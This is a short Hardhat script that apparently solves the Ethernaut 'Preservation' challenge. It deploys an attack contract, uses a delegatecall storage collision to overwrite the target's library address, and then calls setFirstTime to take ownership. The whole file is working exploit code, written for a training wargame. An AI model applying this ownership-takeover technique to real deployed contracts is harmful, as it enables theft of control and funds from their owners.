import { ethers } from "hardhat";
import { Preservation__factory } from "../typechain/factories/contracts/Preservation.sol/Preservation__factory";
import { PreservationAttack__factory } from "../typechain/factories/contracts/PreservationAttack__factory";

async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address =  "0x467eCE9599fBE7546333fc2f4a052041117D4BEE";
    let preservation = new Preservation__factory(signer).attach(instance_address);
    console.log(await preservation.owner());


    let attack = await new PreservationAttack__factory(signer).deploy();
    console.log("attack", attack.address);
    let tx = await preservation.setSecondTime(attack.address, {gasLimit:80000});
    await tx.wait();
    console.log("lib1", await preservation.timeZone1Library());

    tx = await preservation.setFirstTime(signer.address, {gasLimit:80000});
    await tx.wait();
    console.log(await preservation.owner());

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
